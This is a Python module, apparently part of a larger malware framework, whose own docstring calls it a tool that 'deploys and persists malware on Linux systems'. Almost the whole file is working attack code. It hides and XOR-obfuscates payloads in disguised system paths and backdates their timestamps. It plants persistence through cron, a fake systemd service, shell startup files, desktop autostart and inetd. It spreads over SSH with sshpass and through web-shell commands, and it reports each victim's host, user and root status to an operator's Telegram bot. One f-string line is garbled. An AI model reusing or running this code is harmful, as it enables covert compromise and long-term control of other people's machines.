#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
linux_deploy.py - Linux deployment and persistence module
"""

import os
import sys
import subprocess
import shutil
import tempfile
import hashlib
import base64
import json
import time
import threading
import pwd
import grp
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path
from datetime import datetime

# Import logger
from ..utils.logger import get_logger
from ..utils.persistence import get_persistence_manager

logger = get_logger()

class LinuxDeployer:
    """Deploys and persists malware on Linux systems"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.system_info = self._get_system_info()
        
        # Persistence manager
        self.persistence = get_persistence_manager(config)
        
        # Telegram bot for notifications
        self.telegram_bot = None
        self.setup_telegram()
        
        # Deployment paths
        self.deploy_paths = {
            'tmp': '/tmp',
            'var_tmp': '/var/tmp',
            'dev_shm': '/dev/shm',
            'lib': '/lib',
            'usr_lib': '/usr/lib',
            'usr_local': '/usr/local',
            'opt': '/opt',
            'etc': '/etc',
            'home': os.path.expanduser('~'),
            'root': '/root'
        }
        
        # Current payload
        self.payload_path = None
        self.payload_hash = None
        
        logger.info("Linux deployer initialized", module="linux_deploy")
    
    def setup_telegram(self):
        """Setup Telegram bot for notifications"""
        telegram_config = self.config.get('telegram', {})
        bot_token = telegram_config.get('bot_token')
        chat_id = telegram_config.get('deploy_chat_id')
        
        if bot_token and chat_id:
            try:
                from telegram import Bot
                self.telegram_bot = Bot(token=bot_token)
                self.deploy_chat_id = chat_id
                logger.info("Telegram deploy bot initialized", module="linux_deploy")
            except ImportError:
                logger.warning("Telegram module not available", module="linux_deploy")
            except Exception as e:
                logger.error(f"Error setting up Telegram: {e}", module="linux_deploy")
    
    def send_telegram_notification(self, title: str, message: str):
        """Send deployment notification to Telegram"""
        if not self.telegram_bot or not hasattr(self, 'deploy_chat_id'):
            return
        
        try:
            full_message = fb>🐧 {b>\n\n{message}"
            self.telegram_bot.send_message(
                chat_id=self.deploy_chat_id,
                text=full_message,
                parse_mode='HTML'
            )
            logger.debug(f"Telegram deployment notification sent: {title}", module="linux_deploy")
        except Exception as e:
            logger.error(f"Error sending Telegram notification: {e}", module="linux_deploy")
    
    def _get_system_info(self) -> Dict[str, Any]:
        """Get Linux system information"""
        info = {
            'hostname': self._run_command('hostname').strip(),
            'distribution': self._get_distribution(),
            'kernel': self._run_command('uname -r').strip(),
            'architecture': self._run_command('uname -m').strip(),
            'username': pwd.getpwuid(os.getuid()).pw_name,
            'user_id': os.getuid(),
            'is_root': os.getuid() == 0,
            'shell': os.environ.get('SHELL', 'Unknown'),
            'desktop': os.environ.get('XDG_CURRENT_DESKTOP', 'Unknown'),
            'packages': self._get_installed_packages()
        }
        return info
    
    def _run_command(self, command: str) -> str:
        """Run shell command and return output"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            return result.stdout
        except:
            return ""
    
    def _get_distribution(self) -> str:
        """Get Linux distribution"""
        try:
            # Try /etc/os-release
            with open('/etc/os-release', 'r') as f:
                for line in f:
                    if line.startswith('PRETTY_NAME='):
                        return line.split('=')[1].strip().strip('"')
            
            # Try lsb_release
            result = subprocess.run(
                'lsb_release -d',
                shell=True,
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                return result.stdout.split(':')[1].strip()
            
            # Fallback to uname
            return self._run_command('uname -o').strip()
            
        except:
            return "Unknown"
    
    def _get_installed_packages(self) -> List[str]:
        """Get list of installed packages"""
        packages = []
        
        # Try different package managers
        package_managers = [
            ('dpkg -l', r'^ii\s+(\S+)'),
            ('rpm -qa', r'(.+)'),
            ('pacman -Q', r'(.+)'),
            ('apk info', r'(.+)')
        ]
        
        for cmd, pattern in package_managers:
            try:
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    import re
                    matches = re.findall(pattern, result.stdout, re.MULTILINE)
                    packages.extend(matches)
                    break
            except:
                continue
        
        return packages[:50]  # Limit to first 50
    
    def deploy_payload(self, payload_path: str, target_path: str = None,
                      obfuscate: bool = True, hide: bool = True) -> bool:
        """Deploy payload to target system"""
        try:
            if not os.path.exists(payload_path):
                logger.error(f"Payload not found: {payload_path}", module="linux_deploy")
                return False
            
            # Calculate payload hash
            with open(payload_path, 'rb') as f:
                self.payload_hash = hashlib.sha256(f.read()).hexdigest()
            
            # Determine target path
            if target_path is None:
                target_path = self._choose_deployment_path()
            
            # Create target directory if needed
            os.makedirs(os.path.dirname(target_path), exist_ok=True)
            
            # Copy payload
            shutil.copy2(payload_path, target_path)
            self.payload_path = target_path
            
            # Make executable
            os.chmod(target_path, 0o755)
            
            # Apply obfuscation
            if obfuscate:
                self._obfuscate_payload(target_path)
            
            # Apply hiding
            if hide:
                self._hide_file(target_path)
            
            # Set file attributes
            self._set_file_attributes(target_path)
            
            # Send Telegram notification
            self.send_telegram_notification(
                "Payload Deployed",
                f"Host: {self.system_info['hostname']}\n"
                f"User: {self.system_info['username']}\n"
                f"Root: {self.system_info['is_root']}\n"
                f"Distro: {self.system_info['distribution']}\n"
                f"Target: {target_path}\n"
                f"Hash: {self.payload_hash[:16]}..."
            )
            
            logger.info(f"Payload deployed to: {target_path}", module="linux_deploy")
            return True
            
        except Exception as e:
            logger.error(f"Payload deployment error: {e}", module="linux_deploy")
            return False
    
    def _choose_deployment_path(self) -> str:
        """Choose optimal deployment path"""
        import random
        
        # Common Linux system paths
        system_paths = [
            # System libraries
            '/lib/x86_64-linux-gnu/security/pam_tally.so',
            '/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache',
            '/usr/local/lib/python3.9/dist-packages/setuptools/__pycache__',
            
            # Configuration directories
            '/etc/cron.daily/logrotate',
            '/etc/network/if-up.d/upstart',
            '/etc/update-motd.d/98-fsck-at-reboot',
            
            # Temporary directories
            '/tmp/.X11-unix/X0',
            '/var/tmp/systemd-private-*/tmp',
            '/dev/shm/pulse-*/runtime',
            
            # User directories
            f"{self.deploy_paths['home']}/.cache/thumbnails/normal",
            f"{self.deploy_paths['home']}/.config/autostart",
            f"{self.deploy_paths['home']}/.local/share/Trash/files",
            
            # System binaries (if root)
            '/usr/bin/updatedb.mlocate',
            '/usr/sbin/cron.daily',
            '/sbin/dhclient-script'
        ]
        
        # Add random filename
        random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        chosen_path = random.choice(system_paths)
        
        # Replace or append random filename
        if '.' in os.path.basename(chosen_path):
            return chosen_path
        else:
            return os.path.join(chosen_path, f".{random_name}")
    
    def _obfuscate_payload(self, file_path: str):
        """Obfuscate payload to avoid detection"""
        try:
            # Read payload
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Simple XOR obfuscation
            key = os.urandom(32)
            obfuscated = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
            
            # Create bash script that deobfuscates and executes
            stub = f"""#!/bin/bash
# Deobfuscation key
KEY="{key.hex()}"

# Read obfuscated payload
PAYLOAD=$(tail -c +{len(stub.encode()) + 1} "$0")

# Deobfuscate
DECRYPTED=""
for ((i=0;$(echo -n "$PAYLOAD" | wc -c); i++)); do
    BYTE=$(printf "%d" "'$(echo -n "$PAYLOAD" | cut -c $((i+1)))'")
    KEY_BYTE=$((0x$(echo -n "$KEY" | cut -c $((i*2+1))-$((i*2+2)))))
    DEC_BYTE=$((BYTE ^ KEY_BYTE))
    DECRYPTED="$DECRYPTED$(printf "\\\\x%02x" $DEC_BYTE)"
done

# Write to temp file
TEMP_FILE="$(mktemp /tmp/.X11-unix.XXXXXX)"
echo -ne "$DECRYPTED" > "$TEMP_FILE"
chmod +x "$TEMP_FILE"

# Execute
"$TEMP_FILE" &
rm -f "$TEMP_FILE"

exit 0

"""
            
            # Write stub + obfuscated data
            with open(file_path, 'wb') as f:
                f.write(stub.encode())
                f.write(obfuscated)
            
            # Make executable
            os.chmod(file_path, 0o755)
            
            logger.debug(f"Payload obfuscated: {file_path}", module="linux_deploy")
            
        except Exception as e:
            logger.error(f"Payload obfuscation error: {e}", module="linux_deploy")
    
    def _hide_file(self, file_path: str):
        """Hide file using dot prefix and permissions"""
        try:
            # Add dot prefix to filename
            dir_name = os.path.dirname(file_path)
            base_name = os.path.basename(file_path)
            
            if not base_name.startswith('.'):
                hidden_path = os.path.join(dir_name, f".{base_name}")
                shutil.move(file_path, hidden_path)
                self.payload_path = hidden_path
                file_path = hidden_path
            
            # Set hidden permissions
            os.chmod(file_path, 0o600)  # Read/write only by owner
            
            logger.debug(f"File hidden: {file_path}", module="linux_deploy")
            
        except Exception as e:
            logger.error(f"File hiding error: {e}", module="linux_deploy")
    
    def _set_file_attributes(self, file_path: str):
        """Set file attributes to look legitimate"""
        try:
            # Get original timestamp from legitimate system file
            system_files = ['/bin/bash', '/usr/bin/python3', '/etc/passwd']
            for sys_file in system_files:
                if os.path.exists(sys_file):
                    stat = os.stat(sys_file)
                    os.utime(file_path, (stat.st_atime, stat.st_mtime))
                    break
            
            # Set ownership to root if we're root
            if self.system_info['is_root']:
                os.chown(file_path, 0, 0)  # root:root
            
            logger.debug(f"File attributes set: {file_path}", module="linux_deploy")
            
        except Exception as e:
            logger.error(f"File attribute setting error: {e}", module="linux_deploy")
    
    def establish_persistence(self, methods: List[str] = None) -> Dict[str, bool]:
        """Establish persistence using multiple methods"""
        if methods is None:
            methods = ['cron', 'systemd', 'bashrc', 'profile', 'autostart']
        
        results = {}
        
        logger.info(f"Establishing persistence using {len(methods)} methods", module="linux_deploy")
        
        for method in methods:
            try:
                if method == 'cron':
                    success = self._persist_via_cron()
                elif method == 'systemd':
                    success = self._persist_via_systemd()
                elif method == 'bashrc':
                    success = self._persist_via_bashrc()
                elif method == 'profile':
                    success = self._persist_via_profile()
                elif method == 'autostart':
                    success = self._persist_via_autostart()
                elif method == 'inetd':
                    success = self._persist_via_inetd()
                else:
                    logger.warning(f"Unknown persistence method: {method}", module="linux_deploy")
                    success = False
                
                results[method] = success
                
                if success:
                    logger.info(f"Persistence established via {method}", module="linux_deploy")
                else:
                    logger.warning(f"Persistence failed via {method}", module="linux_deploy")
                    
            except Exception as e:
                logger.error(f"Persistence error for {method}: {e}", module="linux_deploy")
                results[method] = False
        
        # Send Telegram notification
        successful = sum(1 for r in results.values() if r)
        total = len(results)
        
        self.send_telegram_notification(
            "Persistence Established",
            f"Host: {self.system_info['hostname']}\n"
            f"Methods: {successful}/{total} successful\n"
            f"Payload: {self.payload_path}"
        )
        
        return results
    
    def _persist_via_cron(self) -> bool:
        """Establish persistence via cron"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="linux_deploy")
                return False
            
            # Determine cron file based on user
            if self.system_info['is_root']:
                cron_file = '/etc/crontab'
                cron_line = f"* * * * * root {self.payload_path} >/dev/null 2>&1\n"
            else:
                cron_file = f"{self.deploy_paths['home']}/.config/cron/crontab"
                cron_line = f"* * * * * {self.payload_path} >/dev/null 2>&1\n"
            
            # Create cron directory if needed
            os.makedirs(os.path.dirname(cron_file), exist_ok=True)
            
            # Add cron job
            with open(cron_file, 'a') as f:
                f.write(cron_line)
            
            # Reload cron if system crontab
            if self.system_info['is_root']:
                self._run_command('systemctl restart cron 2>/dev/null || systemctl restart crond 2>/dev/null || service cron restart 2>/dev/null')
            else:
                # User cron
                self._run_command('crontab -l 2>/dev/null | cat - && echo "' + cron_line.strip() + '" | crontab -')
            
            logger.debug(f"Cron persistence set: {cron_file}", module="linux_deploy")
            return True
            
        except Exception as e:
            logger.error(f"Cron persistence error: {e}", module="linux_deploy")
            return False
    
    def _persist_via_systemd(self) -> bool:
        """Establish persistence via systemd service"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="linux_deploy")
                return False
            
            # Only works with root
            if not self.system_info['is_root']:
                logger.warning("Root privileges required for systemd persistence", module="linux_deploy")
                return False
            
            service_name = "systemd-network-helper"
            service_file = f"/etc/systemd/system/{service_name}.service"
            
            # Create service file
            service_content = f"""[Unit]
Description=Systemd Network Helper Service
After=network.target

[Service]
Type=simple
ExecStart={self.payload_path}
Restart=always
RestartSec=10
User=root
Group=root

[Install]
WantedBy=multi-user.target
"""
            
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            # Enable and start service
            self._run_command(f'systemctl enable {service_name}')
            self._run_command(f'systemctl start {service_name}')
            
            logger.debug(f"Systemd service created: {service_file}", module="linux_deploy")
            return True
            
        except Exception as e:
            logger.error(f"Systemd persistence error: {e}", module="linux_deploy")
            return False
    
    def _persist_via_bashrc(self) -> bool:
        """Establish persistence via .bashrc"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="linux_deploy")
                return False
            
            bashrc_file = f"{self.deploy_paths['home']}/.bashrc"
            bashrc_line = f"\n# Start background process\n{self.payload_path} >/dev/null 2>&1 &\n"
            
            # Add to .bashrc
            with open(bashrc_file, 'a') as f:
                f.write(bashrc_line)
            
            logger.debug(f"Bashrc persistence set: {bashrc_file}", module="linux_deploy")
            return True
            
        except Exception as e:
            logger.error(f"Bashrc persistence error: {e}", module="linux_deploy")
            return False
    
    def _persist_via_profile(self) -> bool:
        """Establish persistence via .profile"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="linux_deploy")
                return False
            
            profile_files = [
                f"{self.deploy_paths['home']}/.profile",
                f"{self.deploy_paths['home']}/.bash_profile",
                f"{self.deploy_paths['home']}/.zshrc",
                f"{self.deploy_paths['home']}/.zprofile"
            ]
            
            success = False
            profile_line = f"\n# Start background process\n{self.payload_path} >/dev/null 2>&1 &\n"
            
            for profile_file in profile_files:
                if os.path.exists(profile_file):
                    with open(profile_file, 'a') as f:
                        f.write(profile_line)
                    success = True
                    logger.debug(f"Profile persistence set: {profile_file}", module="linux_deploy")
            
            return success
            
        except Exception as e:
            logger.error(f"Profile persistence error: {e}", module="linux_deploy")
            return False
    
    def _persist_via_autostart(self) -> bool:
        """Establish persistence via desktop autostart"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="linux_deploy")
                return False
            
            desktop = self.system_info['desktop'].lower()
            autostart_dir = f"{self.deploy_paths['home']}/.config/autostart"
            
            # Create autostart directory
            os.makedirs(autostart_dir, exist_ok=True)
            
            # Create .desktop file
            desktop_file = os.path.join(autostart_dir, "system-monitor.desktop")
            desktop_content = f"""[Desktop Entry]
Type=Application
Name=System Monitor
Exec={self.payload_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
            
            with open(desktop_file, 'w') as f:
                f.write(desktop_content)
            
            logger.debug(f"Autostart persistence set: {desktop_file}", module="linux_deploy")
            return True
            
        except Exception as e:
            logger.error(f"Autostart persistence error: {e}", module="linux_deploy")
            return False
    
    def _persist_via_inetd(self) -> bool:
        """Establish persistence via inetd/xinetd"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="linux_deploy")
                return False
            
            # Only works with root
            if not self.system_info['is_root']:
                logger.warning("Root privileges required for inetd persistence", module="linux_deploy")
                return False
            
            # Check for xinetd or inetd
            if os.path.exists('/etc/xinetd.d'):
                # xinetd
                service_file = '/etc/xinetd.d/network_helper'
                service_content = f"""service network_helper
{{
    disable = no
    socket_type = stream
    protocol = tcp
    wait = no
    user = root
    server = {self.payload_path}
    port = 5353
}}
"""
                with open(service_file, 'w') as f:
                    f.write(service_content)
                
                self._run_command('systemctl restart xinetd 2>/dev/null || service xinetd restart 2>/dev/null')
                
            elif os.path.exists('/etc/inetd.conf'):
                # inetd
                inetd_line = f"network_helper stream tcp nowait root {self.payload_path} network_helper\n"
                with open('/etc/inetd.conf', 'a') as f:
                    f.write(inetd_line)
                
                self._run_command('killall -HUP inetd 2>/dev/null')
            
            logger.debug("Inetd persistence set", module="linux_deploy")
            return True
            
        except Exception as e:
            logger.error(f"Inetd persistence error: {e}", module="linux_deploy")
            return False
    
    def deploy_remote(self, target_host: str, payload_path: str,
                     credentials: Dict[str, str] = None) -> bool:
        """Deploy payload to remote Linux system"""
        try:
            logger.info(f"Attempting remote deployment to {target_host}", module="linux_deploy")
            
            if credentials:
                username = credentials.get('username')
                password = credentials.get('password')
                
                # Use SSH with password
                ssh_cmd = f"sshpass -p '{password}' scp {payload_path} {username}@{target_host}:/tmp/update"
                result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True)
                
                if result.returncode == 0:
                    # Make executable and add to cron
                    exec_cmd = f"sshpass -p '{password}' ssh {username}@{target_host} 'chmod +x /tmp/update && (crontab -l 2>/dev/null; echo \"* * * * * /tmp/update >/dev/null 2>&1\") | crontab -'"
                    subprocess.run(exec_cmd, shell=True, capture_output=True)
            else:
                # Try SSH with keys
                ssh_cmd = f"scp {payload_path} {target_host}:/tmp/update"
                result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True)
                
                if result.returncode == 0:
                    # Make executable and add to cron
                    exec_cmd = f"ssh {target_host} 'chmod +x /tmp/update && (crontab -l 2>/dev/null; echo \"* * * * * /tmp/update >/dev/null 2>&1\") | crontab -'"
                    subprocess.run(exec_cmd, shell=True, capture_output=True)
            
            if result.returncode == 0:
                self.send_telegram_notification(
                    "Remote Deployment Successful",
                    f"Target: {target_host}\n"
                    f"Payload: {os.path.basename(payload_path)}\n"
                    f"Method: SSH"
                )
                
                logger.info(f"Remote deployment successful to {target_host}", module="linux_deploy")
                return True
            else:
                logger.warning(f"Remote deployment failed to {target_host}: {result.stderr}", module="linux_deploy")
                return False
            
        except Exception as e:
            logger.error(f"Remote deployment error: {e}", module="linux_deploy")
            return False
    
    def deploy_via_webshell(self, url: str, payload_path: str,
                           password: str = None) -> bool:
        """Deploy payload via web shell"""
        try:
            import requests
            
            # Read payload
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
            
            # Encode payload
            encoded_payload = base64.b64encode(payload_data).decode('utf-8')
            
            # Prepare request
            data = {
                'cmd': f'echo {encoded_payload} | base64 -d > /tmp/.update && chmod +x /tmp/.update',
                'pwd': password or 'cmd'
            }
            
            # Send request
            response = requests.post(url, data=data, timeout=30)
            
            if response.status_code == 200:
                # Execute payload
                exec_data = {
                    'cmd': 'nohup /tmp/.update >/dev/null 2>&1 &',
                    'pwd': password or 'cmd'
                }
                requests.post(url, data=exec_data, timeout=30)
                
                # Add to crontab
                cron_data = {
                    'cmd': '(crontab -l 2>/dev/null; echo "* * * * * /tmp/.update >/dev/null 2>&1") | crontab -',
                    'pwd': password or 'cmd'
                }
                requests.post(url, data=cron_data, timeout=30)
                
                self.send_telegram_notification(
                    "Web Shell Deployment",
                    f"URL: {url}\n"
                    f"Payload deployed and persisted"
                )
                
                logger.info(f"Deployed via web shell: {url}", module="linux_deploy")
                return True
            else:
                logger.warning(f"Web shell deployment failed: HTTP {response.status_code}", module="linux_deploy")
                return False
            
        except Exception as e:
            logger.error(f"Web shell deployment error: {e}", module="linux_deploy")
            return False
    
    def cleanup(self, remove_payload: bool = True) -> bool:
        """Cleanup deployment artifacts"""
        try:
            cleanup_count = 0
            
            # Remove payload file
            if remove_payload and self.payload_path and os.path.exists(self.payload_path):
                try:
                    os.remove(self.payload_path)
                    cleanup_count += 1
                    logger.debug(f"Payload removed: {self.payload_path}", module="linux_deploy")
                except:
                    pass
            
            # Remove cron entries
            if self.system_info['is_root']:
                cron_file = '/etc/crontab'
                if os.path.exists(cron_file):
                    with open(cron_file, 'r') as f:
                        lines = f.readlines()
                    with open(cron_file, 'w') as f:
                        for line in lines:
                            if self.payload_path not in line:
                                f.write(line)
                            else:
                                cleanup_count += 1
            else:
                # Remove user cron
                self._run_command('crontab -l 2>/dev/null | grep -v "' + self.payload_path + '" | crontab -')
                cleanup_count += 1
            
            # Remove systemd service
            if self.system_info['is_root']:
                service_name = "systemd-network-helper"
                service_file = f"/etc/systemd/system/{service_name}.service"
                if os.path.exists(service_file):
                    self._run_command(f'systemctl stop {service_name} 2>/dev/null')
                    self._run_command(f'systemctl disable {service_name} 2>/dev/null')
                    os.remove(service_file)
                    cleanup_count += 1
            
            # Remove from .bashrc
            bashrc_file = f"{self.deploy_paths['home']}/.bashrc"
            if os.path.exists(bashrc_file):
                with open(bashrc_file, 'r') as f:
                    lines = f.readlines()
                with open(bashrc_file, 'w') as f:
                    for line in lines:
                        if self.payload_path not in line:
                            f.write(line)
                        else:
                            cleanup_count += 1
            
            # Remove autostart
            autostart_file = f"{self.deploy_paths['home']}/.config/autostart/system-monitor.desktop"
            if os.path.exists(autostart_file):
                os.remove(autostart_file)
                cleanup_count += 1
            
            logger.info(f"Cleanup completed: {cleanup_count} artifacts removed", module="linux_deploy")
            return True
            
        except Exception as e:
            logger.error(f"Cleanup error: {e}", module="linux_deploy")
            return False
    
    def get_deployment_info(self) -> Dict[str, Any]:
        """Get deployment information"""
        return {
            'system_info': self.system_info,
            'payload_path': self.payload_path,
            'payload_hash': self.payload_hash,
            'deploy_paths': self.deploy_paths,
            'timestamp': datetime.now().isoformat()
        }
    
    def get_status(self) -> Dict[str, Any]:
        """Get deployer status"""
        return {
            'system': 'Linux',
            'distribution': self.system_info['distribution'],
            'root': self.system_info['is_root'],
            'packages': len(self.system_info['packages']),
            'payload_deployed': self.payload_path is not None,
            'telegram_available': self.telegram_bot is not None
        }

# Global instance
_linux_deployer = None

def get_linux_deployer(config: Dict = None) -> LinuxDeployer:
    """Get or create Linux deployer instance"""
    global _linux_deployer
    
    if _linux_deployer is None:
        _linux_deployer = LinuxDeployer(config)
    
    return _linux_deployer

if __name__ == "__main__":
    # Test the Linux deployer
    config = {
        'telegram': {
            'bot_token': 'test_token',
            'deploy_chat_id': 123456789
        }
    }
    
    deployer = get_linux_deployer(config)
    
    print("Testing Linux deployer...")
    print(f"Host: {deployer.system_info['hostname']}")
    print(f"User: {deployer.system_info['username']}")
    print(f"Root: {deployer.system_info['is_root']}")
    print(f"Distro: {deployer.system_info['distribution']}")
    
    # Create test payload
    test_payload = os.path.join(tempfile.gettempdir(), 'test_payload')
    with open(test_payload, 'wb') as f:
        f.write(b'#!/bin/bash\necho "Test payload running"\nsleep 1\n')
    
    os.chmod(test_payload, 0o755)
    
    # Test deployment
    print("\nTesting payload deployment...")
    deployed = deployer.deploy_payload(test_payload, obfuscate=False, hide=False)
    print(f"Payload deployed: {deployed}")
    
    if deployed:
        # Test persistence
        print("\nTesting persistence methods...")
        persistence_results = deployer.establish_persistence(['cron', 'bashrc'])
        print(f"Persistence results: {persistence_results}")
    
    # Get deployment info
    info = deployer.get_deployment_info()
    print(f"\nDeployment info: {info.get('payload_path')}")
    
    # Show status
    status = deployer.get_status()
    print(f"\n🐧 Linux Deployer Status: {status}")
    
    # Cleanup
    print("\nCleaning up...")
    deployer.cleanup()
    
    # Remove test payload
    if os.path.exists(test_payload):
        os.remove(test_payload)
    
    print("\n✅ Linux deployer tests completed!")
